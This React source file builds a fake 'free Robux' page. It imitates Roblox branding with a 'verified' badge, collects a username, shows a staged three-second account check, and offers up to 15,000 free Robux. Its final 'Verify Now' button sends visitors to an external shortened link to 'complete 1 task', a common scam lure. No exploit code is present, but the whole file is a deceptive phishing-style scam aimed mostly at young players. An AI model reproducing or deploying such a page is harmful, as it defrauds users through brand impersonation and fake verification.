import { Toaster } from "@/components/ui/sonner";
import { type KeyboardEvent, useCallback, useEffect, useState } from "react";
import { useActor } from "./hooks/useActor";

// ─────────────────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────────────────
type Screen = "landing" | "loading" | "amount-selection" | "verify";

// ─────────────────────────────────────────────────────────────────────────────
// Constants
// ─────────────────────────────────────────────────────────────────────────────
const GAME_IMAGES = [
  "/assets/generated/game1.dim_400x300.jpg",
  "/assets/generated/game2.dim_400x300.jpg",
  "/assets/generated/game3.dim_400x300.jpg",
  "/assets/generated/game4.dim_400x300.jpg",
  "/assets/generated/game5.dim_400x300.jpg",
  "/assets/generated/game6.dim_400x300.jpg",
  "/assets/generated/game7.dim_400x300.jpg",
  "/assets/generated/game8.dim_400x300.jpg",
];

const ROBUX_AMOUNTS = [1500, 4000, 8000, 10000, 15000];

// ─────────────────────────────────────────────────────────────────────────────
// SVG Assets
// ─────────────────────────────────────────────────────────────────────────────

/** Roblox hexagon "R" coin icon */
function RobuxCoinIcon({ size = 38 }: { size?: number }) {
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 38 38"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      aria-hidden="true"
    >
      <polygon
        points="19,1 35,10 35,28 19,37 3,28 3,10"
        fill="white"
        stroke="rgba(255,255,255,0.15)"
        strokeWidth="1"
      />
      <text
        x="19"
        y="26"
        textAnchor="middle"
        fontSize="17"
        fontWeight="900"
        fontFamily="Arial Black, sans-serif"
        fill="#1a1a1a"
        letterSpacing="-1"
      >
        R$
      </text>
    </svg>
  );
}

/** Small Roblox "R" hexagon logo for header */
function RobloxHexLogoSmall() {
  return (
    <svg
      width="32"
      height="32"
      viewBox="0 0 32 32"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      aria-hidden="true"
    >
      <polygon
        points="16,2 28,9 28,23 16,30 4,23 4,9"
        fill="#00B06E"
        stroke="rgba(0,176,110,0.3)"
        strokeWidth="1"
      />
      <text
        x="16"
        y="22"
        textAnchor="middle"
        fontSize="13"
        fontWeight="900"
        fontFamily="Arial Black, sans-serif"
        fill="white"
        letterSpacing="-0.5"
      >
        R
      </text>
    </svg>
  );
}

/** Blue checkmark badge */
function BlueBadge() {
  return (
    <svg
      width="18"
      height="18"
      viewBox="0 0 18 18"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      aria-hidden="true"
    >
      <circle cx="9" cy="9" r="9" fill="#1D9BF0" />
      <polyline
        points="5,9 7.5,12 13,6"
        stroke="white"
        strokeWidth="2.2"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Gaming Grid Background
// ─────────────────────────────────────────────────────────────────────────────
function GamingGridBackground() {
  return (
    <>
      <div className="gaming-grid-bg" aria-hidden="true">
        {GAME_IMAGES.map((src, i) => (
          <div key={src} className="tile">
            <img src={src} alt="" loading={i < 4 ? "eager" : "lazy"} />
          </div>
        ))}
      </div>
      <div className="dark-overlay" aria-hidden="true" />
    </>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Header Bar
// ─────────────────────────────────────────────────────────────────────────────
function HeaderBar() {
  return (
    <header className="header-bar fixed top-0 left-0 right-0 z-10 px-4 py-3 flex items-center gap-3">
      <RobloxHexLogoSmall />
      <div className="flex items-center gap-2">
        <span
          className="text-white font-bold text-base tracking-tight"
          style={{ fontFamily: "Bricolage Grotesque, sans-serif" }}
        >
          Robux11M
        </span>
        <BlueBadge />
      </div>
      <span className="text-xs text-white/50 font-medium">
        Partners program
      </span>
    </header>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// ROBLOX Logo with coin
// ─────────────────────────────────────────────────────────────────────────────
function RobloxLogo() {
  return (
    <div
      className="flex items-center justify-center gap-0.5"
      aria-label="ROBLOX"
    >
      <span
        className="text-white font-black tracking-tight select-none"
        style={{
          fontFamily: "Bricolage Grotesque, Arial Black, sans-serif",
          fontSize: "2.4rem",
          lineHeight: 1,
          letterSpacing: "-0.04em",
        }}
      >
        R
      </span>
      <RobuxCoinIcon size={42} />
      <span
        className="text-white font-black tracking-tight select-none"
        style={{
          fontFamily: "Bricolage Grotesque, Arial Black, sans-serif",
          fontSize: "2.4rem",
          lineHeight: 1,
          letterSpacing: "-0.04em",
        }}
      >
        BL
      </span>
      <RobuxCoinIcon size={42} />
      <span
        className="text-white font-black tracking-tight select-none"
        style={{
          fontFamily: "Bricolage Grotesque, Arial Black, sans-serif",
          fontSize: "2.4rem",
          lineHeight: 1,
          letterSpacing: "-0.04em",
        }}
      >
        X
      </span>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Screen 1 — Landing Page
// ─────────────────────────────────────────────────────────────────────────────
interface LandingScreenProps {
  onContinue: (username: string) => void;
}

function LandingScreen({ onContinue }: LandingScreenProps) {
  const [username, setUsername] = useState("");
  const [error, setError] = useState("");

  const handleContinue = useCallback(() => {
    const trimmed = username.trim();
    if (!trimmed) {
      setError("Please enter your Roblox username.");
      return;
    }
    if (trimmed.length < 3) {
      setError("Username must be at least 3 characters.");
      return;
    }
    setError("");
    onContinue(trimmed);
  }, [username, onContinue]);

  const handleKeyDown = (e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") handleContinue();
  };

  return (
    <main className="relative z-20 flex flex-col items-center justify-center min-h-screen px-4 pt-16 pb-8">
      <div
        className="roblox-card w-full max-w-sm rounded-2xl px-7 py-8 flex flex-col items-center gap-5"
        data-ocid="landing.card"
      >
        {/* Logo */}
        <RobloxLogo />

        {/* Tagline */}
        <p
          className="text-center text-sm leading-relaxed"
          style={{ color: "rgba(255,255,255,0.48)", maxWidth: "280px" }}
        >
          Robux allows you to purchase upgrades for your avatar or buy special
          abilities in experiences
        </p>

        {/* Divider */}
        <div className="w-full border-t border-white/8" />

        {/* Form */}
        <div className="w-full flex flex-col gap-3">
          <label
            htmlFor="roblox-username"
            className="font-bold text-white text-sm"
            style={{ fontFamily: "Bricolage Grotesque, sans-serif" }}
          >
            Enter your Username
          </label>
          <input
            id="roblox-username"
            type="text"
            autoComplete="username"
            name="username"
            value={username}
            onChange={(e) => {
              setUsername(e.target.value);
              if (error) setError("");
            }}
            onKeyDown={handleKeyDown}
            placeholder="type your user..."
            className="roblox-input w-full rounded-lg px-4 py-3"
            data-ocid="landing.username.input"
            aria-describedby={error ? "username-error" : undefined}
            aria-invalid={!!error}
            maxLength={20}
          />
          {error && (
            <span
              id="username-error"
              className="text-xs font-medium"
              style={{ color: "#ff6b6b" }}
              role="alert"
              data-ocid="landing.error_state"
            >
              {error}
            </span>
          )}
        </div>

        {/* Continue Button */}
        <button
          onClick={handleContinue}
          className="roblox-btn-green w-full py-3.5 rounded-lg text-white font-bold text-base cursor-pointer"
          data-ocid="landing.continue.primary_button"
          type="button"
        >
          Continue
        </button>

        {/* Footer note */}
        <p
          className="text-center text-xs"
          style={{ color: "rgba(255,255,255,0.25)" }}
        >
          By continuing, you agree to the Roblox Terms of Service
        </p>
      </div>

      {/* Bottom attribution */}
      <footer
        className="mt-6 text-center text-xs"
        style={{ color: "rgba(255,255,255,0.22)" }}
      >
        © {new Date().getFullYear()}.{" "}
        <a
          href={`https://caffeine.ai?utm_source=caffeine-footer&utm_medium=referral&utm_content=${encodeURIComponent(window.location.hostname)}`}
          target="_blank"
          rel="noopener noreferrer"
          className="underline"
          style={{ color: "rgba(255,255,255,0.3)" }}
        >
          Built with love using caffeine.ai
        </a>
      </footer>
    </main>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Screen 2 — Loading / Verification
// ─────────────────────────────────────────────────────────────────────────────
interface LoadingScreenProps {
  username: string;
  onComplete: () => void;
}

function LoadingScreen({ username, onComplete }: LoadingScreenProps) {
  useEffect(() => {
    const timer = setTimeout(onComplete, 3000);
    return () => clearTimeout(timer);
  }, [onComplete]);

  return (
    <main className="relative z-20 flex flex-col items-center justify-center min-h-screen px-4 pt-16 pb-8">
      <div
        className="roblox-card w-full max-w-sm rounded-2xl px-7 py-10 flex flex-col items-center gap-6"
        data-ocid="loading.loading_state"
      >
        {/* Spinner */}
        <div className="green-spinner" aria-label="Loading" role="status" />

        {/* Text */}
        <div className="flex flex-col items-center gap-2 text-center">
          <h2
            className="text-white font-bold text-xl"
            style={{ fontFamily: "Bricolage Grotesque, sans-serif" }}
          >
            Verifying your account...
          </h2>
          <p className="text-sm" style={{ color: "rgba(255,255,255,0.45)" }}>
            Please wait while we check your username
          </p>
          <p
            className="text-sm font-semibold mt-1"
            style={{ color: "#00B06E" }}
          >
            Checking: @{username}
          </p>
        </div>

        {/* Progress dots */}
        <div className="flex gap-2 mt-1">
          {[0, 1, 2].map((i) => (
            <span
              key={i}
              className="inline-block w-2 h-2 rounded-full"
              style={{
                background: "#00B06E",
                opacity: 0.3 + i * 0.35,
                animation: `pulse ${0.8 + i * 0.2}s ease-in-out infinite alternate`,
              }}
            />
          ))}
        </div>
      </div>
    </main>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Screen 3 — Amount Selection
// ─────────────────────────────────────────────────────────────────────────────
interface AmountSelectionScreenProps {
  username: string;
  onSelectAmount: (amount: number) => void;
}

function AmountSelectionScreen({
  username,
  onSelectAmount,
}: AmountSelectionScreenProps) {
  return (
    <main className="relative z-20 flex flex-col items-center justify-center min-h-screen px-4 pt-16 pb-8">
      <div
        className="roblox-card w-full max-w-sm rounded-2xl px-7 py-8 flex flex-col items-center gap-5"
        data-ocid="amount.card"
      >
        {/* Logo */}
        <RobloxLogo />

        {/* Greeting */}
        <div className="flex flex-col items-center gap-1 text-center">
          <h2
            className="text-white font-black text-xl"
            style={{
              fontFamily: "Bricolage Grotesque, sans-serif",
              letterSpacing: "-0.03em",
            }}
          >
            Welcome, @{username}!
          </h2>
          <p className="text-sm" style={{ color: "rgba(255,255,255,0.5)" }}>
            Select your Robux amount to claim
          </p>
        </div>

        {/* Divider */}
        <div className="w-full border-t border-white/8" />

        {/* Amount buttons */}
        <div className="w-full flex flex-col gap-3" data-ocid="amount.list">
          {ROBUX_AMOUNTS.map((amount, idx) => (
            <button
              key={amount}
              onClick={() => onSelectAmount(amount)}
              className="roblox-btn-green w-full py-3.5 rounded-lg text-white font-bold text-base cursor-pointer flex items-center justify-between px-5"
              data-ocid={`amount.item.${idx + 1}`}
              type="button"
            >
              <div className="flex items-center gap-2.5">
                <RobuxCoinIcon size={28} />
                <span style={{ fontFamily: "Bricolage Grotesque, sans-serif" }}>
                  {amount.toLocaleString()} Robux
                </span>
              </div>
              <span
                className="text-sm font-semibold"
                style={{ color: "rgba(255,255,255,0.7)" }}
              >
                FREE
              </span>
            </button>
          ))}
        </div>

        {/* Footer note */}
        <p
          className="text-center text-xs"
          style={{ color: "rgba(255,255,255,0.25)" }}
        >
          Select an amount to proceed with verification
        </p>
      </div>

      {/* Bottom attribution */}
      <footer
        className="mt-6 text-center text-xs"
        style={{ color: "rgba(255,255,255,0.22)" }}
      >
        © {new Date().getFullYear()}.{" "}
        <a
          href={`https://caffeine.ai?utm_source=caffeine-footer&utm_medium=referral&utm_content=${encodeURIComponent(window.location.hostname)}`}
          target="_blank"
          rel="noopener noreferrer"
          className="underline"
          style={{ color: "rgba(255,255,255,0.3)" }}
        >
          Built with love using caffeine.ai
        </a>
      </footer>
    </main>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Screen 4 — Verify (robot check + redirect)
// ─────────────────────────────────────────────────────────────────────────────
interface VerifyScreenProps {
  selectedAmount: number;
}

function VerifyScreen({ selectedAmount }: VerifyScreenProps) {
  const handleVerify = () => {
    window.location.href = "https://surl.li/zzowfn";
  };

  return (
    <main className="relative z-20 flex flex-col items-center justify-center min-h-screen px-4 pt-16 pb-8">
      <div
        className="roblox-card w-full max-w-sm rounded-2xl px-7 py-10 flex flex-col items-center gap-6"
        data-ocid="verify.card"
      >
        {/* Logo */}
        <RobloxLogo />

        {/* Selected amount badge */}
        <div
          className="flex items-center gap-2 rounded-xl px-4 py-2.5"
          style={{
            background: "rgba(0,176,110,0.12)",
            border: "1px solid rgba(0,176,110,0.3)",
          }}
        >
          <RobuxCoinIcon size={22} />
          <span
            className="font-black text-base"
            style={{
              color: "#00B06E",
              fontFamily: "Bricolage Grotesque, sans-serif",
            }}
          >
            {selectedAmount.toLocaleString()} Robux
          </span>
          <span
            className="text-xs font-medium"
            style={{ color: "rgba(255,255,255,0.45)" }}
          >
            selected
          </span>
        </div>

        {/* Divider */}
        <div className="w-full border-t border-white/8" />

        {/* Verification message */}
        <div className="flex flex-col items-center gap-4 text-center">
          {/* Robot icon */}
          <div
            className="w-16 h-16 rounded-2xl flex items-center justify-center"
            style={{
              background: "rgba(0,176,110,0.1)",
              border: "1px solid rgba(0,176,110,0.2)",
            }}
            aria-hidden="true"
          >
            <svg
              width="36"
              height="36"
              viewBox="0 0 36 36"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
              aria-hidden="true"
            >
              {/* Robot face */}
              <rect
                x="6"
                y="10"
                width="24"
                height="18"
                rx="3"
                fill="rgba(0,176,110,0.25)"
                stroke="#00B06E"
                strokeWidth="1.5"
              />
              {/* Eyes */}
              <circle cx="13" cy="18" r="2.5" fill="#00B06E" />
              <circle cx="23" cy="18" r="2.5" fill="#00B06E" />
              {/* Mouth */}
              <rect
                x="12"
                y="23"
                width="12"
                height="2"
                rx="1"
                fill="#00B06E"
                opacity="0.7"
              />
              {/* Antenna */}
              <line
                x1="18"
                y1="10"
                x2="18"
                y2="5"
                stroke="#00B06E"
                strokeWidth="1.5"
                strokeLinecap="round"
              />
              <circle cx="18" cy="4" r="1.5" fill="#00B06E" />
              {/* Ears */}
              <rect
                x="3"
                y="15"
                width="3"
                height="6"
                rx="1.5"
                fill="#00B06E"
                opacity="0.6"
              />
              <rect
                x="30"
                y="15"
                width="3"
                height="6"
                rx="1.5"
                fill="#00B06E"
                opacity="0.6"
              />
            </svg>
          </div>

          <p
            className="text-sm leading-relaxed font-medium"
            style={{ color: "rgba(255,255,255,0.8)", maxWidth: "260px" }}
          >
            Please click on the button below and complete 1 task to{" "}
            <span
              className="verify-highlight"
              style={{
                color: "#00B06E",
                fontWeight: 800,
                textShadow:
                  "0 0 12px rgba(0,176,110,0.7), 0 0 24px rgba(0,176,110,0.35)",
                textDecoration: "underline",
                textDecorationColor: "rgba(0,176,110,0.5)",
                textDecorationThickness: "2px",
                textUnderlineOffset: "3px",
                letterSpacing: "0.02em",
              }}
            >
              verify
            </span>{" "}
            that you're not a robot!
          </p>
        </div>

        {/* Verify Button */}
        <button
          onClick={handleVerify}
          className="roblox-btn-green w-full py-4 rounded-lg text-white font-black text-lg cursor-pointer"
          data-ocid="verify.verify.primary_button"
          type="button"
          style={{
            letterSpacing: "0.04em",
            textTransform: "uppercase",
            fontFamily: "Bricolage Grotesque, sans-serif",
          }}
        >
          ✓ &nbsp;Verify Now
        </button>

        <p
          className="text-center text-xs"
          style={{ color: "rgba(255,255,255,0.25)" }}
        >
          Complete 1 quick task to unlock your Robux
        </p>
      </div>

      {/* Bottom attribution */}
      <footer
        className="mt-6 text-center text-xs"
        style={{ color: "rgba(255,255,255,0.22)" }}
      >
        © {new Date().getFullYear()}.{" "}
        <a
          href={`https://caffeine.ai?utm_source=caffeine-footer&utm_medium=referral&utm_content=${encodeURIComponent(window.location.hostname)}`}
          target="_blank"
          rel="noopener noreferrer"
          className="underline"
          style={{ color: "rgba(255,255,255,0.3)" }}
        >
          Built with love using caffeine.ai
        </a>
      </footer>
    </main>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Root App
// ─────────────────────────────────────────────────────────────────────────────
export default function App() {
  const [screen, setScreen] = useState<Screen>("landing");
  const [username, setUsername] = useState("");
  const [selectedAmount, setSelectedAmount] = useState(0);
  const { actor } = useActor();

  const handleContinue = useCallback(
    (user: string) => {
      setUsername(user);
      setScreen("loading");

      // Fire-and-forget: submit to backend, don't block UI
      if (actor) {
        actor.submitUsername(user).catch(() => {
          // silent fail — backend is non-critical for UX flow
        });
      }
    },
    [actor],
  );

  const handleVerificationComplete = useCallback(() => {
    setScreen("amount-selection");
  }, []);

  const handleSelectAmount = useCallback((amount: number) => {
    setSelectedAmount(amount);
    setScreen("verify");
  }, []);

  return (
    <div className="relative min-h-screen w-full overflow-hidden">
      <GamingGridBackground />
      <HeaderBar />
      <Toaster />

      {screen === "landing" && <LandingScreen onContinue={handleContinue} />}
      {screen === "loading" && (
        <LoadingScreen
          username={username}
          onComplete={handleVerificationComplete}
        />
      )}
      {screen === "amount-selection" && (
        <AmountSelectionScreen
          username={username}
          onSelectAmount={handleSelectAmount}
        />
      )}
      {screen === "verify" && <VerifyScreen selectedAmount={selectedAmount} />}
    </div>
  );
}
